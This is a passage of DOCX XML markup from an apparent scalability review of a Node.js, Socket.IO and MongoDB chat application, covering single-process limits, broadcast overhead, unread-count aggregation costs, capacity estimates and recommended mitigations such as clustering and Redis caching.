        <w:t>const io = require("socket.io")(server, ...);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The entire application — HTTP server, Socket.IO engine, and in-memory state — runs within a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>single Node.js process</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>. This means: - Only one CPU core is utilized, regardless of the server hardware's multi-core capability. - A single CPU-intensive operation (e.g., large aggregation query) blocks the event loop for all connected users. - There is no fault tolerance; a crash takes down the entire service.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Constraint B — Global Broadcast for Status Changes:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// server.js — User status change broadcast:</w:t>
        <w:br/>
        <w:t>io.emit("user status change", {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    userId,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    status: "online",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    lastSeen: now,</w:t>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>io.emit()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> broadcasts to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>every connected socket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>. With N users online, each status change generates N WebSocket write operations. For frequent status transitions (users going active/away repeatedly), this creates O(N) network overhead per event.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Constraint C — Per-Request Aggregation for Unread Counts:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// chatControllers.js — fetchChats:</w:t>
        <w:br/>
        <w:t>const unreadCounts = await Message.aggregate([</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $match: {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            chat: { $in: chatIds },</w:t>
        <w:br/>
        <w:t xml:space="preserve">            sender: { $ne: req.user._id },</w:t>
        <w:br/>
        <w:t xml:space="preserve">            readBy: { $ne: req.user._id },</w:t>
        <w:br/>
        <w:t xml:space="preserve">            isSystemMessage: { $ne: true },</w:t>
        <w:br/>
        <w:t xml:space="preserve">            deletedFor: { $ne: req.user._id },</w:t>
        <w:br/>
        <w:t xml:space="preserve">        },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    { $group: { _id: "$chat", count: { $sum: 1 } } },</w:t>
        <w:br/>
        <w:t>]);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">This aggregation pipeline runs </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>on every `GET /api/chat` request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> for every user. With M chats and K messages, the pipeline scans up to M×K message documents per request. For a user with 50 chats and 10,000 total messages, this represents significant database I/O per page load.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 Scaling Ceiling Estimates</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Metric</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Current Capacity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bottleneck</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Concurrent WebSocket connections</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>~1,000-5,000 per process</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Single Node.js event loop + memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Message throughput</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>~500-1,000 messages/second</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Database write latency + broadcast fanout</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Status broadcast overhead</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>O(N) per status change</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>io.emit()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> to all sockets</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Unread count query time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>O(M×K) per user page load</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MongoDB aggregation without indexes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.4 Current Mitigation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>- Node.js's non-blocking I/O handles concurrent connections efficiently for small-to-medium user bases. - MongoDB's WiredTiger engine provides efficient read performance for moderate data volumes. - Socket.IO's internal buffering handles burst traffic gracefully.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.5 Recommended Mitigation</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mitigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Priority</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement Node.js clustering (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>cluster</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> module) to utilize multiple CPU cores</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Use Redis as Socket.IO adapter for multi-process WebSocket state sharing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Cache unread counts in Redis, update incrementally on message events</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
